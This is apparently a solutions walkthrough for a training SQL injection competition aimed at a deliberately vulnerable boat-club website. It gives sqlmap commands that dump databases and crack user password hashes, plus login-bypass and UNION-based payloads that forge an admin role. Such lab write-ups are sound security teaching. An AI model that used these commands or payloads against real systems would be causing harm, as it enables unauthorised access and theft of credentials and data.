# SQL Injection Competition
## About
This page contains the solutions for the competition. A text solution is provided for each question.

## Contents
- [Question 1](#question-1)
- [Question 2](#question-2)
- [Question 3](#question-3)
- [Question 4](#question-4)
- [Question 5](#question-5)
- [Question 6](#question-6)
- [Question 7](#question-7)
- [Question 8](#question-8)

## Question 1
__Question:__ The events page is only supposed to show public events. How many events are there in total (including privates ones)?

__Answer:__ 14

__Solution:__

The events pages contains a search bar which allows you to search for events in the database. 

You could enter a query, submit the form and get the url `https://sql.cybersoc.org.uk/events?query=t`. This contains the get parameter that is vulnerable to SQL injection.

Using SQLMap, you could provide the command `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -dbs`. This would return:
```
available databases [3]:
[*] boat_club
[*] information_schema
[*] performance_schema
```

From the output, the database that is being used is `boat_club`. You could then run the command `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -D boat_club --tables`. This specifies the database that we are interested in and allows us to see the tables in the databases. This would return:
```
Database: boat_club
[3 tables]
+--------+
| boats  |
| events |
| users  |
+--------+
```

From the tables output, the table `events` is where all the events are being stored. To find the answer to the question, you could run `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -D boat_club -T events --dump`. This specifies the database and table that were are interested in, and will output the contents of the table from the dump command. This would return (only the id, title and public columns are shown here due to space):
```
Database: boat_club
Table: events
[14 entries]
+----+---------------------------------+--------+
| id | title                           | public |
+----+---------------------------------+--------+
| 1  | Spring Festival 2022            | 1      |
| 2  | Dinner with Chris               | 0      |
| 3  | Summer Festival 2022            | 1      |
| 4  | Boat Parade 2022                | 1      |
| 5  | Meet & Greet                    | 0      |
| 6  | Autumn Festival 2022            | 1      |
| 7  | Cook with James                 | 0      |
| 8  | Winter Festival 2022            | 1      |
| 9  | Yacht Tours                     | 1      |
| 10 | Christmas Party                 | 0      |
| 11 | New Year 2023 Party             | 0      |
| 12 | Speed Boat Race                 | 1      |
| 13 | Cook with Martin                | 0      |
| 14 | Carp Fishing with Thomas Gerard | 0      |
+----+---------------------------------+--------+
```

You could then see from the dump command that there were __14__ events in total.

## Question 2
__Question:__ How many users are there in the database?

__Answer:__ 6

__Solution:__ 

Staying on the events that was used to find the answer in [question 1](#question-1), we could use the output from the command that showed the tables in the `boat_club` database. The table that we are interested is `users`. You could run the command `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -D boat_club -T users --dump`. This table contains password and if you follow the prompts by SQLMap for a dictionary based attack, you could also see the raw passwords that would be helpful for [question 3](#question-3). The output would be:
```
Database: boat_club
Table: users
[6 entries]
+----+--------+----------------+----------------------------------------------+----------+
| id | role   | fullname       | password                                     | username |
+----+--------+----------------+----------------------------------------------+----------+
| 1  | member | Steve Business | 7cf2db5ec261a0fa27a502d3196a6f60 (pizza)     | steve    |
| 2  | member | Alex Smith     | c378985d629e99a4e86213db0cd5e70d (chocolate) | alex     |
| 3  | member | Morgan Robson  | e2bbb098e9f3c4367dd6121e90df7ab9 (beans)     | morgan   |
| 4  | member | Bob Wilson     | 8b433670258f79578f9a4e5ea388b007 (sausage)   | bob      |
| 5  | member | Laura Wilson   | 19136e394ab695f9b071eb24e88ab14d (chips)     | laura    |
| 6  | member | Donald Johnson | 006f87892f47ef9aa60fa5ed01a440fb (tomato)    | donald   |
+----+--------+----------------+----------------------------------------------+----------+
```

If you look at the output from the dump command, you could see that there were __6__ users.

## Question 3
__Question:__ What is Alex's password?

__Answer:__ chocolate

__Solution:__

If you ran the command `sqlmap -u "https://sql.cybersoc.org.uk/events?query=t" -D boat_club -T users --dump` from [question 2](#question-2), and used SQLMap to perform a dictionary based attack, you could see the raw passwords. This command produced the output:
```
Database: boat_club
Table: users
[6 entries]
+----+--------+----------------+----------------------------------------------+----------+
| id | role   | fullname       | password                                     | username |
+----+--------+----------------+----------------------------------------------+----------+
| 1  | member | Steve Business | 7cf2db5ec261a0fa27a502d3196a6f60 (pizza)     | steve    |
| 2  | member | Alex Smith     | c378985d629e99a4e86213db0cd5e70d (chocolate) | alex     |
| 3  | member | Morgan Robson  | e2bbb098e9f3c4367dd6121e90df7ab9 (beans)     | morgan   |
| 4  | member | Bob Wilson     | 8b433670258f79578f9a4e5ea388b007 (sausage)   | bob      |
| 5  | member | Laura Wilson   | 19136e394ab695f9b071eb24e88ab14d (chips)     | laura    |
| 6  | member | Donald Johnson | 006f87892f47ef9aa60fa5ed01a440fb (tomato)    | donald   |
+----+--------+----------------+----------------------------------------------+----------+
```

We can see in this output, the password for Alex is `chocolate`.

## Question 4
__Question:__ Login into the member's area. What is the member motto?

__Answer:__ "Carp is love, carp is life!"

__Solution:__

There are two possible solutions for this question.

One solution is to use the username and password that you obtained for Alex (or any other user) and submit that to the login form.

Another solution is to input `' or 1=1;--` into the login form and submit that. This would select the first record in the users tables, which is Steve.

After logging, you could click the 'Member Motto' button and could see that the motto is __"Carp is love, carp is life!"__

## Question 5
__Question:__ There is a different database, used somewhere in the member's area, which contains financial information. What is the name of that database? (Hint: You will need to use a cookie)

__Answer:__ geordie_boat_rentals_ltd

__Solution:__

There are two pages in the member area that were vulnerable to SQL injection. These were 'Search Members' and 'Rent a Boat'.

The 'Search Members' page used the same database that was contained the `events` and `users` tables in the previous questions.

The 'Rent a Boat' was the database that used a different database. You could select a category in the dropdown menu, submit it and get the url `https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski`. The `category` get parameter is vulnerable to SQL injection.

As you had to log in to get to the member's area, you will need to use a cookie. The cookie will contain your session that authorises you to access this page. You can find your cookie value using the developer tools in your web browser, make sure to copy the whole value to provide to SQLMap.

To find the name of this database you could use the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -dbs`. This would give the output:
```
available databases [3]:
[*] geordie_boat_rentals_ltd
[*] information_schema
[*] performance_schema
```

From the output above, you could see that the database being used is __geordie_boat_rentals_ltd__.

You could also see that the database contained a table called `payments`, related to financial information, by running the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd --tables`. This would return:
```
Database: geordie_boat_rentals_ltd
[2 tables]
+----------+
| boats    |
| payments |
+----------+
```
## Question 6
__Question:__ In the same database, what is the total sum of all the money in payments table?

__Answer:__ 569221

__Solution:__

Using the 'Rent a Boat' page from [question 5](#question-5), you could use the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd -T payments --dump` to see what the table contained.

This would have returned 126 rows from the table. Just using the dump command is not enough to find the sum of all the money in the `payments` table. To easily calculate the sum, you could run the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" --sql-shell`. This would open a SQL shell, which you could run SQL commands.

In the SQL shell, you could run the SQL command `SELECT SUM(money) FROM payments;`. This would return the sum of the money, __569221__, contained in the money column of the `payments` table.

## Question 7
__Question:__ Try to gain access to the admin area. What is the admin motto? (Hint: SQLMap might not be useful for this but error messages might be)

__Answer:__ "The admins rule the seas!"

__Solution:__

If you logged in to member's area using the solution used in [question 3](#question-3), you would only have the role `member`. If you visited the admin area, while being a member, you would have seen an unauthorised error which said that the role `admin` was required.

To get the role `admin` you would have to log in again. The table `users`, in [question 3](#question-3), only contained users with the `member` role. This means that you couldn't use SQLMap to find a user with the required role, and you would have to find another way to get the role `admin`.

If you were to submit `'` as the username in the login form, this would have caused an error in the SQL syntax and produced an error on the server. You would be redirected to an error page, which gave a hint to the SQL command being used to check the login credentials. The command being used is:
```mysql
SELECT username, role from users WHERE username='' AND password=MD5('')
```

The SQL command selects the columns `username` and `role`. You could inject some SQL into the username of the login form to provide your own username and role. One possible input you could use is: 
```
' UNION SELECT 'admin', 'admin';--
```
This would mean that the command executed by the server would be:
```mysql
SELECT username, role from users WHERE username='' UNION SELECT 'admin', 'admin'
```
This command means that nothing from the `users` table would be selected, and by using union, the result of the command would be `admin` as the username and `admin` as the role.

If you submitted the login form, using this input, you would see that you had the role `admin` on the member's area and on the user button the navigation bar.

You could then press the option for the 'Admin Area' and then the option to view the 'Admin Motto' and see that the motto is __"The admins rule the seas!"__

## Question 8
__Question:__ Bonus: Where is the treasure buried according to the secure access page in the admin area? (Hint: This isn't SQL injection but the dev tools in the browser may help)

__Answer:__ "The treasure is buried next to the statue of John Hook"

__Solution:__

If you tried to access the 'secure access' page, you would have seen an unauthorised error requiring that you use the `Top Secret Boat Club Browser` to access the page.

This wasn't SQL injection, but you could use the web developer tools in your browser to change your `User Agent` to `Top Secret Boat Club Browser` and refresh the page.

You could then see the content of this page and see __"The treasure is buried next to the statue of John Hook"__
